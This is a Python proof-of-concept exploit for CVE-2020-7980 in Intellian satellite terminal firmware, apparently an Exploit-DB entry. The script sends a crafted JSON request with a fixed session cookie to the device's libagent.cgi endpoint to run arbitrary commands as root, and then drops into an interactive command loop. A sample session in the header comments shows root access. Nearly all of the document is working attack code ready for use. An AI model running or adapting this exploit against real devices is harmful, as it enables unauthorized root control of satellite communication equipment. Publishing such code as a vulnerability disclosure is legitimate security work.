# Exploit Title: Satellian
# Date: 28/01/2020
# Exploit Author: Xh4H
# Vendor Homepage: https://www.intelliantech.com/?lang=en
# Version: v1.12+
# Tested on: Kali linux, MacOS
# CVE : CVE-2020-7980

# xh4h@Macbook-xh4h ~/Satellian> python satellian.py -u http://<redacted>
#                   ________________________________________
#         (__)    /                                        \
#         (oo)   (     Intellian Satellite Terminal PoC     )
#   /-------\/ --' \________________________________________/ 
#  / |     ||
# *  ||----||             

# Performing initial scan. Listing available system binaries.
# Starting request to http://<redacted>
# Executing command /bin/ls /bin
# acu_server
# acu_tool
# addgroup
# adduser
# ...

# Satellian $ id
# uid=0(root) gid=0(root)

import requests
import argparse
import sys
import calendar
import time
from termcolor import colored

def cprint(text, color): # colored print
	sys.stdout.write(colored(text + "\n", color, attrs=["bold"]))

def httpize(url):
	if not url.startswith("http"):
		cprint("Missing protocol, using http . . .", "yellow")
		url = "http://" + url
	return url

def send_command(url, command, verbose):
	RCE = {"O_":"A","V_":1,"S_":123456789,"F_":"EXEC_CMD","P1_":{"F":"EXEC_CMD","Q":command}}
	string_to_split = '''"SUCCESS_"
},'''

	if verbose:
		cprint("Starting request to %s" % url, "yellow")
		cprint("Executing command %s" % command, "yellow")

	a = requests.post(url + '/cgi-bin/libagent.cgi?type=J&' + str(calendar.timegm(time.gmtime())) + '000', json=RCE, cookies={'ctr_t': '0', 'sid': '123456789'})
	command_output = a.content[a.content.find(string_to_split):-2].replace(string_to_split, '')

	if len(command_output) < 4 and verbose:
		cprint("Target doesn't seem to be vulnerable\nExiting.", 'red')
		sys.exit()
	print command_output

cprint("""
                  ________________________________________
         (__)    /                                        \\
         (oo)   (     Intellian Satellite Terminal PoC     )
  /-------\\/ --' \\________________________________________/ 
 / |     ||
*  ||----||             
""", "green")

parser = argparse.ArgumentParser(description="Satellian: A PoC script for CVE-2020-7980")
parser.add_argument("-u", "--url", help="Base url")
args = parser.parse_args()

if args.url is None:
	cprint("Missing arguments.\nUsage example:\n" + sys.argv[0] + " -u http://10.10.10.14\n", "red")
	sys.exit()

url = httpize(args.url)

def main():
	cprint("Performing initial scan. Listing available system binaries.", "green")
	send_command(url, '/bin/ls /bin', True)

	while True:
		command = raw_input('Satellian $ ')
		send_command(url, command, False)

if __name__ == '__main__':
	try:
		main()
	except Exception as e:
		print e
		print "\nAn error happened."
